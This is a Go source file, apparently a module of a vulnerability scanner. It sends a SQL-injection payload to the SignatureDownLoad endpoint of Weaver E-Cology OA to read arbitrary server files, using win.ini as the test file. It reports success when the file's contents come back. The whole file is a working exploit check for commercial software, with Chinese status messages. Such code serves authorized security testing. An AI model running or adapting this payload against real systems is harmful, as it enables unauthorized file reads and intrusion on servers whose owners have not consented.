package ecology_SignatureDownLoad

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"io/ioutil"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func Run(url string) {
	vulnUrl := url + "/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-15] 泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞不存在")
		return
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		color.Red.Println("[-15] 泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞不存在")
		return
	}
	body := string(bodyBytes)

	if resp.StatusCode == 200 && strings.Contains(body, "[fonts]") {
		color.Green.Println("[+15] 泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞 存在 -> ", vulnUrl)
	} else {
		color.Red.Println("[-15] 泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞不存在")
	}
}
